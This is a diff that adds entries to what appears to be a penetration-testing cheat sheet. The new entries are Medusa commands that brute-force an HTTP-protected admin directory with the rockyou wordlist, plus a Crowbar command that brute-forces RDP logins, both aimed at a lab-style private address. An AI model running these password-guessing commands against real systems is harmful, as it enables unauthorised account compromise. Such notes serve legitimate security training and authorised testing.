@@ -15,3 +15,14 @@ PLACEHOLDER	CHARACTER TRANSLATION
 
 crunch 4 6 0123456789ABCDEF(char set) -o crunch.txt
 ```
+### Medusa
+###### HTTP htaccess Attack with Medusa
+```
+medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
+medusa -d(check out supported modules)
+```
+
+### Crowbar
+```
+crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
+```
